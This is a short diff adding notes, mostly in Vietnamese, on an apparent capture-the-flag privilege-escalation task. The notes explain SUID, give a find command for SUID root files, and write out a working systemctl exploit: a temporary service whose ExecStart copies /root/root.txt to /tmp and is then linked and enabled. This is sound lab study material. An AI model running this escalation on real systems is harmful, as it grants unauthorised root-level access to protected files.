@@ -1,0 +1,20 @@
+-  Task 5 : Vượt quyền
+. Trong Linux, SUID (set userId của chủ sở hữu khi thực thi) là một loại quyền tệp đặc biệt được cấp cho một tệp.  SUID cấp quyền tạm thời cho người dùng để chạy chương trình / tệp với sự cho phép của chủ sở hữu tệp (chứ không phải người dùng chạy chương trình / tệp đó)
+. Ví dụ: tệp nhị phân để thay đổi mật khẩu của bạn có bit SUID được đặt trên đó (/ usr / bin / passwd).  Điều này là do để thay đổi mật khẩu của bạn, nó sẽ cần phải ghi vào tệp shadowers mà bạn không có quyền truy cập, root thì có, vì vậy nó có đặc quyền root để thực hiện các thay đổi phù hợp.
+1. On the system, search for all SUID files. What file stands out?
+hint : find / -user root -perm -4000 -exec ls -ldb {} \;
+ - Các file permission denied là các file yêu cầu cấp quyền root 
+để ý file bin/systemctl
+/bin: Thư mục này chứa các file chương trình thực thi dạng nhị phân và các chương trình khởi động của hệ thống.
+về systemctl dùng để điều khiển hệ thống và service : https://medium.com/t-blog/linux-systemctl-command-d71d83f90a9a
+2.https://gtfobins.github.io/gtfobins/systemctl/
+https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49
+eop=$(mktemp).service   // tạo 1 service
+echo '[Service]         //
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output" //thêm lệnh thực thi
+[Install]                 
+WantedBy=multi-user.target' >$eop          
+/bin/systemctl link $eop     
+/bin/systemctl enable --now $eop
+
+cat /tmp/output => flag 
